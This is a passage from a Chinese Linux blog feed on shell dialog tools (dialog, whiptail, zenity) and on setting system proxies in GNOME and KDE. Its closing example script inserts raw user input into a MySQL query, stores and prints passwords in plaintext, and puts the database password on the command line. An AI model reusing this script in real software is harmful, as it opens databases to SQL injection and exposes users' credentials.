<strong>–extra-button</strong> 在OK按钮和Cancel按钮之间显示一个额外按钮<br />
<strong>–extra-label label</strong> 指定额外按钮的替代标签<br />
<strong>–help</strong> 显示dialog命令的帮助信息<br />
<strong>–help-button</strong> 在OK按钮和Cancel按钮后显示一个Help按钮<br />
<strong>–help-label label</strong> 指定Help按钮的替代标签<br />
<strong>–help-status</strong> 当选定Help按钮后,在帮助信息后写入多选列表、单选列表或表单信息<br />
<strong>–ignore</strong> 忽略dialog不能识别的选项<br />
<strong>–input-fd fd</strong> 指定 STDIN 之外的另一个文件描述符<br />
<strong>–insecure</strong> 在password部件中键入内容时显示星号<br />
<strong>–item-help</strong> 为多选列表、单选列表或菜单中的每个标号在屏幕的底部添加一个帮助栏<br />
<strong>–keep-window</strong> 不要清除屏幕上显示过的部件<br />
<strong>–max-input size</strong> 指定输入的最大字符串长度。默认为2048<br />
<strong>–nocancel</strong> 隐藏Cancel按钮<br />
<strong>–no-collapse</strong> 不要将对话文本中的制表符转换成空格<br />
<strong>–no-kill</strong> 将tailboxbg对话放到后台,并禁止该进程的 SIGHUP 信号<br />
<strong>–no-label label</strong> 为No按钮指定替代标签<br />
<strong>–no-shadow</strong> 不要显示对话窗口的阴影效果<br />
<strong>–ok-label label</strong> 指定OK按钮的替代标签</p>
</blockquote>
<p><strong>注意: dialog 默认是重定向到标准错误(stderr).</strong><br />
不过可以改变输出到标准输出 <strong>–stdout</strong> .这样用脚本也就能很快获取返回的文本了</p>
<h4 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h4>
<blockquote>
<p>$ dialog –timeout 5 <strong>–stdout</strong> –menu ‘Choose a job: ‘ 30 10 25 ‘Programmer’ 1 ‘Teacher’ 2 ‘Worker’ 3</p>
</blockquote>
<p><a href="http://example.sh">example.sh</a></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>name=$(dialog --max-input 5 --timeout 5 --inputbox &#x27;Please enter your name: &#x27; 10 10 &#x27;root&#x27; --stdout)<br>job=$(dialog  --timeout 5 --stdout --menu  &#x27;Choose a job: &#x27; 30 10 25 &#x27;Programmer&#x27; 1 &#x27;Teacher&#x27; 2 &#x27;Worker&#x27; 3)<br>clear<br>if [ -n &quot;$name&quot; ];then<br>    echo &quot;Your name is: [$name]&quot;<br>else<br><span class="hljs-meta">	#</span><span class="bash"><span class="hljs-keyword">do</span> something...</span><br>fi<br>echo -e &quot;You are a :&quot;$job&quot;\t:)&quot;<br></code></pre></div></td></tr></table></figure>
<h3 id="2whiptail"><a class="markdownIt-Anchor" href="#2whiptail"></a> 2.whiptail</h3>
<p>对比dialog,这个工具参数就少了一点,功能也就少了点,但基本的还是<br />
要有的</p>
<blockquote>
<p>There are visual differences which are not addressed by command-line options:</p>
<p><strong>dialog</strong> centers lists within the window. whiptail typically puts lists against<br />
the left margin.</p>
<p><strong>whiptail</strong> uses angle brackets (“&lt;” and “&gt;”) for marking buttons. dialog uses<br />
square brackets.</p>
<p><strong>whiptail</strong> marks the limits of subtitles with vertical bars. dialog does not<br />
mark the limits.</p>
<p><strong>whiptail</strong> attempts to mark the top/bottom cells of a scrollbar with up/down ar‐<br />
rows. When it cannot do this, it fills those cells with the background color<br />
of the scrollbar and confusing the user. dialog uses the entire scrollbar<br />
space, thereby getting better resolution.</p>
</blockquote>
<h4 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h4>
<p><strong>Most whiptail scripts write tostandard error, but error messages may also be written there, depend‐ing on your script.</strong></p>
<p>help</p>
<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">Box options: <br>	--msgbox &lt;text&gt; &lt;height&gt; &lt;width&gt;<br>	--yesno  &lt;text&gt; &lt;height&gt; &lt;width&gt;<br>	--infobox &lt;text&gt; &lt;height&gt; &lt;width&gt;<br>	--inputbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [init] <br>	--passwordbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [init] <br>	--textbox &lt;file&gt; &lt;height&gt; &lt;width&gt;<br>	--menu &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item] ...<br>	--checklist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item status]...<br>	--radiolist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item status]...<br>	--gauge &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;percent&gt;<br>Options: (depend on box-option)<br>	--clear				clear screen on exit<br>	--defaultno			<span class="hljs-keyword">default</span> no button<br>	--<span class="hljs-keyword">default</span>-item &lt;string&gt;		set <span class="hljs-keyword">default</span> string<br>	--fb, --fullbuttons		use full buttons<br>	--nocancel			no cancel button<br>	--yes-button &lt;text&gt;		set text of yes button<br>	--no-button &lt;text&gt;		set text of no button<br>	--ok-button &lt;text&gt;		set text of ok button<br>	--cancel-button &lt;text&gt;		set text of cancel button<br>	--noitem			don<span class="hljs-number">&#x27;</span>t display items<br>	--notags			don<span class="hljs-number">&#x27;</span>t display tags<br>	--separate-output		output one line at a time<br>	--output-fd &lt;fd&gt;		output to fd, <span class="hljs-keyword">not</span> stdout<br>	--title &lt;title&gt;			display title<br>	--backtitle &lt;backtitle&gt;		display backtitle<br>	--scrolltext			force vertical scrollbars<br>	--topleft			put window in top-left corner<br>	-h, --help			print <span class="hljs-keyword">this</span> message<br>	-v, --version			print version information<br><br></code></pre></div></td></tr></table></figure>
<h4 id="例子-2"><a class="markdownIt-Anchor" href="#例子-2"></a> 例子</h4>
<blockquote>
<p>$ whiptail –title ‘Message’ –msgbox ‘Hi man~’ 10 20 –ok-button ‘OK’<br />
$ whiptail –title ‘Login’ –output-fd 1 –inputbox ‘Please enter username: ‘ 10 20 ‘root’</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>echo &quot;&quot; &gt; .tmp_username<br>echo &quot;&quot; &gt; .tmp_passphras<br>username=$(whiptail --title &#x27;Login&#x27; --inputbox &#x27;Please enter username: &#x27; 10 20 &#x27;root&#x27; 1&gt;&amp;2 2&gt;.tmp_username)<br>if [ &quot;$?&quot; -eq 0 ];then<br>    username=$(cat .tmp_username)<br>    if [[ -n $username  ]];then<br>        echo &quot;==&gt;&quot;$username<br>    else<br>        echo &#x27;Null Username!&#x27;<br>    fi<br>else<br>    echo &quot;ERROR=&gt; &quot;$?<br>    exit<br>fi<br>passphras=$(whiptail --title &#x27;Login&#x27; --passwordbox &#x27;Please enter password: &#x27; 10 20 1&gt;&amp;2 2&gt;.tmp_passphras)<br>if [ &quot;$?&quot; -eq 0 ];then<br>    passphras=$(cat .tmp_passphras)<br>    if [[ -n $passphras  ]];then<br>        echo &quot;==&gt;&quot;$passphras<br>    else<br>        echo &#x27;Null Passphras!&#x27;<br>    fi<br>else<br>    echo &quot;ERROR=&gt; &quot;$?<br>    exit<br>fi<br>rm .tmp_username<br>rm .tmp_passphras<br></code></pre></div></td></tr></table></figure>
<h3 id="3zenity"><a class="markdownIt-Anchor" href="#3zenity"></a> 3.Zenity</h3>
<p>适用于 GNOME环境 的图形化界面包</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">zenity <span class="hljs-comment">--help</span><br>用法：<br>  zenity [<span class="hljs-keyword">OPTION</span>…]<br>帮助选项：<br>  -h, <span class="hljs-comment">--help                               显示帮助选项</span><br>  <span class="hljs-comment">--help-all                               显示全部帮助选项</span><br>  <span class="hljs-comment">--help-general                           显示常规选项</span><br>  <span class="hljs-comment">--help-calendar                          显示日历选项</span><br>  <span class="hljs-comment">--help-entry                             显示文字输入选项</span><br>  <span class="hljs-comment">--help-error                             显示错误选项</span><br>  <span class="hljs-comment">--help-info                              显示信息选项</span><br>  <span class="hljs-comment">--help-file-selection                    显示文件选择选项</span><br>  <span class="hljs-comment">--help-list                              显示列表选项</span><br>  <span class="hljs-comment">--help-notification                      显示通知图标选项</span><br>  <span class="hljs-comment">--help-progress                          显示进度选项</span><br>  <span class="hljs-comment">--help-question                          显示问题选项</span><br>  <span class="hljs-comment">--help-warning                           显示警告选项</span><br>  <span class="hljs-comment">--help-scale                             显示范围选项</span><br>  <span class="hljs-comment">--help-text-info                         显示文本信息选项</span><br>  <span class="hljs-comment">--help-color-selection                   显示颜色选择选项</span><br>  <span class="hljs-comment">--help-password                          显示口令对话框选项</span><br>  <span class="hljs-comment">--help-forms                             显示表单对话框选项</span><br>  <span class="hljs-comment">--help-misc                              显示杂类选项</span><br>  <span class="hljs-comment">--help-gtk                               显示 GTK+ 选项</span><br>应用程序选项：<br>  <span class="hljs-comment">--calendar                               显示日历对话框</span><br>  <span class="hljs-comment">--entry                                  显示文本输入对话框</span><br>  <span class="hljs-comment">--error                                  显示错误对话框</span><br>  <span class="hljs-comment">--info                                   显示信息对话框</span><br>  <span class="hljs-comment">--file-selection                         显示文件选择对话框</span><br>  <span class="hljs-comment">--list                                   显示列表对话框</span><br>  <span class="hljs-comment">--notification                           显示通知</span><br>  <span class="hljs-comment">--progress                               显示进度指示对话框</span><br>  <span class="hljs-comment">--question                               显示问题对话框</span><br>  <span class="hljs-comment">--warning                                显示警告对话框</span><br>  <span class="hljs-comment">--scale                                  显示范围对话框</span><br>  <span class="hljs-comment">--text-info                              显示文本信息对话框</span><br>  <span class="hljs-comment">--color-selection                        显示颜色选择对话框</span><br>  <span class="hljs-comment">--password                               显示口令对话框</span><br>  <span class="hljs-comment">--forms                                  显示表单对话框</span><br>  <span class="hljs-comment">--display=DISPLAY                        X display to use</span><br><br></code></pre></div></td></tr></table></figure>
<blockquote>
<p>$ zenity –help-info<br />
用法：<br />
zenity [OPTION…]</p>
<p>信息选项<br />
–info 显示信息对话框<br />
–text=文字 设置对话框文字<br />
–icon-name=图标名 设置对话框图标<br />
–no-wrap 不启用文本自动换行<br />
–no-markup 不启用 pango 标记<br />
–ellipsize 在对话框文本中启用简略显示。这可以修复带有长文本的窗口的尺寸过大。</p>
</blockquote>
<p>更多信息 man</p>
<blockquote>
<p>$ zenity –info –text=’Hello World’ –title=’Messge’ –width=30 –height=30 –timeout=3<br />
$ find . -name ‘<em>’ | zenity –progress –pulsate<br />
$ find . -name ‘</em>’ | zenity –list –title “Search Results” –text “Finding all header files…” –column “Files”</p>
</blockquote>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>现在，给出一个例子来实现MySQL数据库插入数据，用到了 <strong>dialog</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>exit_code=0<br>is_reg_ok=0<br>trap &quot;echo;echo Have fun!;&quot; EXIT<br><span class="hljs-meta">#</span><span class="bash"> get datetime</span><br>get_datenow()&#123;<br>    local now=$(date +&#x27;%Y-%m-%d %H:%M:%S&#x27;)<br>    echo $now<br>&#125;<br><span class="hljs-meta">#</span><span class="bash"> start MYSQL server</span><br>start_MYSQL_server()&#123;<br>    echo &#x27;Starting MYSQL Server...&#x27;<br>    service mysql start<br>    echo &#x27;MHSQL Started!&#x27;<br>&#125;<br><span class="hljs-meta">#</span><span class="bash"> showed user information when registered successfully</span><br>show_user_info()&#123;<br>    if [[ $is_reg_ok -eq 1 ]];then<br>        echo<br>        #shift<br>        echo -e &quot;UserName: [ \033[1;33m$1\033[0m ]&quot;<br>        echo -e &quot;PassWord: [ \033[1;33m$2\033[0m ]&quot;<br>        echo -e &quot;ID Name: [ \033[1;33m$3\033[0m ]&quot;<br>        echo -e &quot;Register Date: [ \033[1;33m$4\033[0m ]&quot;<br>        echo<br>    fi<br>&#125;<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">###########################################</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment">#       this is a bash script that</span></span> <br><span class="hljs-meta">#</span><span class="bash">       quickly inset user data to mysql server database</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment">############################################</span></span><br>echo<br>echo -e &quot;Welcome to here ,you can register the account quickly...so let &#x27;s go!&#x27;&quot;<br>echo<br>read -p &#x27;Your username: &#x27; -t 8 -r reg_user<br>if [ -z $reg_user ];then echo;echo &#x27;Empty!&#x27;; exit;fi<br>read -p &#x27;Your password: &#x27; -t 8 -r reg_pass<br>if [ -z $reg_pass ];then echo;echo &#x27;Empty!&#x27;; exit;fi<br>read -p &#x27;Your password[confirm]: &#x27; -s -t 8 -r reg_pass_confirm<br>if [ -z $reg_pass_confirm ];then echo;echo &#x27;Password not same!&#x27;; exit;fi<br>echo<br>read -p &#x27;Your ID name: &#x27; -t 8 -r reg_idname<br>if [ -z $reg_idname ];then echo;echo &#x27;Empty!&#x27;; exit;fi<br>start_MYSQL_server<br><span class="hljs-meta">#</span><span class="bash"> here append a --stdout instead of default --stderr,so we can get the result....</span><br>username=$(dialog --max-input 8 --timeout 8 --inputbox &#x27;Please enter MYSQL username: &#x27; 10 10 &#x27;root&#x27; --stdout)<br>exit_code=$?<br>password=$(dialog --max-input 15 --timeout 8 --passwordbox &#x27;Please enter MYSQL password: &#x27; 10 10 --stdout)<br>clear<br><span class="hljs-meta">#</span><span class="bash"> check the username is empty</span><br>if [ &quot;$exit_code&quot; -eq 0 ];then<br>    if [ -z &quot;$username&quot; ] ;then<br>        echo -e &quot;\033[1;31mNot Empty Username!\033[0m&quot;<br>        exit<br>    fi<br>else<br>    exit<br>fi<br>mysql_string=&quot;mysql -u$&#123;username&#125; -p$&#123;password&#125;&quot; <br>now_string=$(get_datenow)<br><span class="hljs-meta">#</span><span class="bash"> register ==&gt; insert data to mysql</span><br><span class="hljs-meta">$</span><span class="bash">&#123;mysql_string&#125; --execute=<span class="hljs-string">&quot;INSERT INTO db_info.tb_users (username,password,idname,reg_datetime) values (&#x27;<span class="hljs-variable">$&#123;reg_user&#125;</span>&#x27;,&#x27;<span class="hljs-variable">$&#123;reg_pass_confirm&#125;</span>&#x27;,&#x27;<span class="hljs-variable">$&#123;reg_idname&#125;</span>&#x27;,&#x27;<span class="hljs-variable">$&#123;now_string&#125;</span>&#x27;);&quot;</span></span><br>if [ &quot;$?&quot; -eq 0 ];then<br>    echo -e &quot;\033[1;32mRegister successfully!\033[0m&quot;<br>    let is_reg_ok=1 <br>    show_user_info $reg_user $reg_pass_confirm $reg_idname $now_string<br>    exit 0<br>else<br>    echo -e &quot;\033[1;31mRegister failed!\033[0m&quot;<br>    exit 1<br>fi<br></code></pre></div></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux修改系统代理</title>
    <url>/linux-system-proxy/</url>
    <content><![CDATA[<p>linux系统代理可以通过shell修改，其效果作用于当前shell或者所有shell，对于像chrome,firefox等桌面浏览器，是不能直接走代理的，除非安装一些proxy插件。不过有时我们想在自己写的程序内设置系统代理，那么这时仅修改shell(http_proxy)之类的是毫无作用的，必须依赖于当前的桌面环境(gnome,kde?)提供的接口，就像windows修改注册表来修改系统代理。</p>
<span id="more"></span>
<h3 id="当前shell"><a class="markdownIt-Anchor" href="#当前shell"></a> 当前shell</h3>
<p>这种方式仅仅对当前shell以及产生的子shell有用，普遍的方法是export导出*_proxy变量：<br />
<code>export http_proxy=http://USERNAME:PASSWORD@SERVER:PORT/</code></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> http_proxy=http://127.0.0.1:8888<br><span class="hljs-built_in">export</span> https_proxy=http://127.0.0.1:8888<br></code></pre></div></td></tr></table></figure>
<p>若希望仅仅对当前shell其作用，那么可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http_proxy=http://127.0.0.1:8888 curl www.google.com --head<br></code></pre></div></td></tr></table></figure>
<p>不过这种通过修改http_proxy等环境变量来设置代理的方法似乎不支持socks。</p>
<h3 id="所有shell"><a class="markdownIt-Anchor" href="#所有shell"></a> 所有shell</h3>
<p>这种情况可以修改<code>/etc/profile</code>、<code>/etc/environment</code>、<code>$HOME/.bashrc</code>、<code>$HOME/.zshrc</code>配置文件，一般来说，只需要修改<code>.bashrc</code>或<code>.zshrc</code>就可以使所有的shell走代理（除非特殊情况）。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># set</span><br><span class="hljs-built_in">export</span> &#123;http,https&#125;_proxy=<span class="hljs-string">&quot;http://127.0.0.1:8888&quot;</span><br><span class="hljs-comment"># unset</span><br><span class="hljs-built_in">unset</span> &#123;http,https&#125;_proxy<br><span class="hljs-comment"># test</span><br>curl -v checkip.dyndns.org<br>curl --head -v www.google.com<br></code></pre></div></td></tr></table></figure>
<p>若希望立即见效，则 <code>source $HOME/.zshrc</code> 或 <code>source $HOME/.bashrc</code>。</p>
<h3 id="gnome"><a class="markdownIt-Anchor" href="#gnome"></a> GNOME</h3>
<p>以上方法对于大部分命令（curl,wget,git等）来说在shell基本上可以走代理。不过我开头说了，我们希望在自己写的程序内设置系统代理，就像v2rayNG修改Windows注册表。</p>
<p>而且这样做的另一个好处是支持socks代理。</p>
<p>确定linux的桌面环境可以通过 <code>env |grep DESKTOP</code> 查看全局环境变量，或者直接 <code>echo $XDG_SESSION_DESKTOP</code>，比如我这里的虚拟机linux gnome3输出<code>gnome-classic</code>。</p>
<p>gnome通过<code>gsettings</code>来管理GNOME3的配置，这样就可以修改系统代理。<br />
一个简单的例子来获取当前gnome的系统代理信息</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gsettings get org.gnome.system.proxy mode<br>gsettings get org.gnome.system.proxy.http host<br>gsettings get org.gnome.system.proxy.http port<br>gsettings get org.gnome.system.proxy.socks host<br>gsettings get org.gnome.system.proxy.socks port<br></code></pre></div></td></tr></table></figure>
<p><code>mode</code>有三种情况：</p>
<ul>
<li>none 无代理</li>
<li>manual 手动代理: 修改http,https,socks等</li>
<li>auto 代理自动配置: PAC</li>
</ul>
<h4 id="一个简单的例子"><a class="markdownIt-Anchor" href="#一个简单的例子"></a> 一个简单的例子：</h4>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy mode <span class="hljs-string">&quot;manual&quot;</span><br>gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.http host <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.http port 8888<br>gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.socks host <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.socks port 1088<br></code></pre></div></td></tr></table></figure>
<p>取消系统代理:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy mode <span class="hljs-string">&quot;none&quot;</span><br></code></pre></div></td></tr></table></figure>
<h4 id="身份验证方式"><a class="markdownIt-Anchor" href="#身份验证方式"></a> 身份验证方式：</h4>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.http use-authentication <span class="hljs-literal">true</span><br>gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.http authentication-user <span class="hljs-string">&quot;xxx&quot;</span><br>gsettings <span class="hljs-built_in">set</span> org.gnome.system.proxy.http authentication-password <span class="hljs-string">&quot;xxx&quot;</span><br></code></pre></div></td></tr></table></figure>
<p>除此之外，还可以设置不经过代理的主机。<br />
不过我这里v2ray配置了路由功能，这样的话即使是manual在访问国内网站时依然不走代理。</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gsettings get org.gnome.system.proxy ignore-hosts <br></code></pre></div></td></tr></table></figure>
<p>默认输出 <code>['localhost', '127.0.0.0/8', '::1']</code></p>
<h4 id="pac"><a class="markdownIt-Anchor" href="#pac"></a> PAC</h4>
<blockquote>
<p>代理自动配置（Proxy auto-config，简称PAC）是一种网页浏览器技术，用于定义浏览器该如何自动选择适当的代理服务器来访问一个网址。</p>
</blockquote>
<p>也就是国内不走代理，国外走代理，一般来说可以加快网站访问速度。<br />
关于PAC网上有很多文章介绍，此处不再赘述。</p>
<p>gsettings设置如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">gsettings get org.gnome.system.proxy autoconfig-url <br><span class="hljs-string">&#x27;http://127.0.0.1:xxxx/pac&#x27;</span><br></code></pre></div></td></tr></table></figure>
<h3 id="kde"><a class="markdownIt-Anchor" href="#kde"></a> KDE</h3>
<p>对于KDE来说，通过 <code>kwriteconfig5</code> 来修改系统代理，指定的配置文件一般位于 <code>$HOME/.config/kioslaverc</code>，内容大致如下，有点类似于windows的ini配置文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">AutoResume=<span class="hljs-literal">true</span><br>ProxyUrlDisplayFlags=0<br><br>[Proxy Settings]<br>Proxy Config Script=<br>ProxyType=0<br>ReversedException=<span class="hljs-literal">false</span><br>ftpProxy=http://localhost 8888<br>httpProxy=http://localhost 8888<br>httpsProxy=http://localhost 8888<br>socksProxy=socks://localhost 1088<br></code></pre></div></td></tr></table></figure>
<p>kwriteconfig5的help信息</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">kwriteconfig5<br>Usage: kwriteconfig5 [options] value<br><br>Options:<br>  -h, --<span class="hljs-built_in">help</span>       Displays <span class="hljs-built_in">help</span> on commandline options.<br>  --help-all       Displays <span class="hljs-built_in">help</span> including Qt specific options.<br>  --file &lt;file&gt;    Use &lt;file&gt; instead of global config<br>  --group &lt;group&gt;  Group to look <span class="hljs-keyword">in</span>. Use repeatedly <span class="hljs-keyword">for</span> nested groups.<br>  --key &lt;key&gt;      Key to look <span class="hljs-keyword">for</span><br>  --<span class="hljs-built_in">type</span> &lt;<span class="hljs-built_in">type</span>&gt;    Type of variable. Use <span class="hljs-string">&quot;bool&quot;</span> <span class="hljs-keyword">for</span> a boolean, otherwise it is<br>                   treated as a string<br>  --delete         Delete the designated key <span class="hljs-keyword">if</span> enabled<br><br>Arguments:<br>  value            The value to write. Mandatory, on a shell use <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">for</span> empty<br></code></pre></div></td></tr></table></figure>
<p>于是KDE下修改系统代理变得十分简单：</p>
